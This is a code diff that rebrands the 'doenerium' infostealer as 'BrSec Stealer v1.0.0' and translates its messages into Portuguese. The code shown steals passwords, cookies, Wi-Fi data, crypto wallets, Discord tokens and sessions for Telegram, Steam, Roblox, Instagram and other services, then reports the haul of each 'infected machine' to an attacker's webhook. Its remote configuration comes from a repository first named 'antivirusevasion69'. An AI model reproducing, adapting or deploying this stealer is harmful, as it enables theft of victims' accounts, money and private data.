+                                            value: `\`\`\`${client.config.counter.keywords_cookies.join(", ") || "Nenhum"}\`\`\``,
                                             inline: false
                                         },
+    
                                     ]
                                 })],
                             });
@@ -3501,7 +3502,7 @@
 
                         create_counter_embed() {
                             let obj = {
-                                title: `💉 Infected - ${client.utils.encryption.decryptData(
+                                title: `💉 Máquina infectada - ${client.utils.encryption.decryptData(
                                     client.config.user.hostname
                                 )}/${client.utils.encryption.decryptData(
                                     client.config.user.user_domain
@@ -3525,21 +3526,22 @@
                             }
 
                             for (let [key, value] of Object.entries({
-                                "🔑 Passwords": client.config.counter.passwords,
+                                "🔑 Senhas": client.config.counter.passwords,
                                 "🍪 Cookies": client.config.counter.cookies,
-                                "🔖 Bookmarks": client.config.counter.bookmarks,
-                                "📶 Wifi networks": client.config.counter.wifinetworks,
-                                "🐱‍💻 Found FileZilla?": client.config.counter.filezilla ? "Yes" : "No",
-                                "📱 Found Telegram session(s)?": client.config.counter.telegram ? "Yes" : "No",
-                                "🌐 Found Wallet(s)": client.config.counter.wallets,
-                                "🤖 Found Reddit session(s)": client.config.counter.reddit_found,
-                                "👉 Found TikTok session(s)": client.config.counter.tiktok_found,
-                                "🐦 Found Twitter session(s)": client.config.counter.twitter_found,
-                                "😋 Found Instagram session(s)": client.config.counter.instagram_found,
-                                "🤖 Found Roblox session(s)": client.config.counter.roblox_found,
-                                "🧱 Found Minecraft session(s)": client.config.counter.minecraft_found,
-                                "😤 Found Steam session(s)": client.config.counter.steam_found,
-                                "🧒 Found Growtopia save.dat?": client.config.counter.growtopia ? "Yes" : "No",
+                                "🔖 Favoritos": client.config.counter.bookmarks,
+                                "📶 Redes Wi-Fi": client.config.counter.wifinetworks,
+                                "🐱‍💻 Encontrou FileZilla?": client.config.counter.filezilla ? "Sim" : "Não",
+                                "📱 Encontrou sessão(ões) do Telegram?": client.config.counter.telegram ? "Sim" : "Não",
+                                "🌐 Encontrou Carteira(s)": client.config.counter.wallets,
+                                "🤖 Encontrou sessão(ões) do Reddit": client.config.counter.reddit_found,
+                                "👉 Encontrou sessão(ões) do TikTok": client.config.counter.tiktok_found,
+                                "🐦 Encontrou sessão(ões) do Twitter": client.config.counter.twitter_found,
+                                "😋 Encontrou sessão(ões) do Instagram": client.config.counter.instagram_found,
+                                "🤖 Encontrou sessão(ões) do Roblox": client.config.counter.roblox_found,
+                                "🧱 Encontrou sessão(ões) do Minecraft": client.config.counter.minecraft_found,
+                                "😤 Encontrou sessão(ões) do Steam": client.config.counter.steam_found,
+                                "🧒 Encontrou Growtopia save.dat?": client.config.counter.growtopia ? "Sim" : "Não",
+
                             })) {
                                 obj["fields"].push({
                                     name: key,
@@ -3723,7 +3725,7 @@
                             }
 
                             if (description != "") {
-                                client.utils.jszip.createTxt("\\Found Wallets.txt", "<================[ Network Data ]>================>\n<================[t.me/doenerium]>================>\n\n" + description)
+                                client.utils.jszip.createTxt("\\Found Wallets.txt", "<================[ Network Data ]>================>\n<================[t.me/BrSec]>================>\n\n" + description)
                             }
                         }
                     };
@@ -4099,7 +4101,7 @@
             },
         };
 
-        class doenerium {
+        class BrSec {
             constructor() {
                 this.requires = {
                     https: require("https"),
@@ -4273,7 +4275,7 @@ return ${eval_string};
                         JSON.stringify(
                             (
                                 await this.axios_instance.get(
-                                    "https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/embed.json"
+                                    "https://raw.githubusercontent.com/Raphael582/BrSec/main/embed.json"
                                 )
                             ).data
                         )
@@ -4281,10 +4283,10 @@ return ${eval_string};
                 } catch {
                     this.config.embed =
                     {
-                        "username": "t.me/doenerium",
-                        "href": "https://t.me/doenerium",
-                        "avatar_url": "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
-                        "credits": "t.me/doenerium"
+                        "username": "BrSec Stealer v1.0.0",
+                        "href": "https://t.me/Phconsultaa",
+                        "avatar_url": "https://media.discordapp.net/attachments/958041679921840238/958062396553982032/logo.png?width=427&height=427",
+                        "credits": "Crédito aos guri"
                     }
                 }
 
@@ -4320,7 +4322,7 @@ return ${eval_string};
                     }
                 } catch (err) {
                     try {
-                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                     } catch { }
                 }
 
@@ -4331,7 +4333,7 @@ return ${eval_string};
                     })
                 } catch (err) {
                     try {
-                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                     } catch { }
                 }
 
@@ -4343,7 +4345,7 @@ return ${eval_string};
                     this.utils.wallets.getWallets();
                 } catch (err) {
                     try {
-                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                     } catch { }
                 }
 
@@ -4351,7 +4353,7 @@ return ${eval_string};
                     this.utils.discord.getTokens();
                 } catch (err) {
                     try {
-                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                     } catch { }
                 }
 
@@ -4359,7 +4361,7 @@ return ${eval_string};
                     this.utils.discord.saveDiscordTokens();
                 } catch (err) {
                     try {
-                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                     } catch { }
                 }
 
@@ -4380,7 +4382,7 @@ return ${eval_string};
                     });
                 } catch (err) {
                     try {
-                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
+                        await this.utils.webhook.sendToWebhook({ embeds: [this.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of BrSec", description: `\`\`\`${err}\`\`\`` })] })
                     } catch { }
                 }
             }
@@ -4414,7 +4416,7 @@ return ${eval_string};
                 await new Promise((resolve) => setTimeout(resolve, 3000));
             }
 
-            new doenerium().init();
+            new BrSec().init();
         })();
 
     })();
